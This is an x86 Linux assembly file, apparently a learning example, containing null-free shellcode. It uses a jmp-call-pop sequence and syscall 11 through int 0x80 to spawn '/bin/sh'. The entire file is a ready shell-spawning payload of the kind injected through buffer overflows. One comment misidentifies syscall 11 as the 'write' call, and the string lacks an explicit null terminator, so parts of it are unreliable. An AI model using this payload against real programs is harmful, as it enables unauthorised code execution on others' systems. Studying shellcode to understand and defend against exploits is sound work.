; shell_aleix.asm
[SECTION .text]

global _start
_start:
    jmp short ender
    starter:

    xor eax, eax    ; clean up the registers
    xor ebx, ebx    ; as we shall see later, using these instructions
    xor ecx, ecx    ;   allow us to avoid having nulls (\0) on our
    xor edx, edx    ;   shellcode

    mov al, 11      ; search which is the code for write system call
    pop ebx         ; get the process name
    xor ecx, ecx
    xor edx, edx    
    int 0x80        ; Interrupt for kernel to run the syscall

    xor eax, eax
    mov al, 1       ; exit the application
    xor ebx, ebx
    int 0x80

    ender:
    call starter    ; put the address of the string on the stack as
                    ;   the return addr from the call
    db '/bin/sh'    ; place this bytes directly right there in the executable
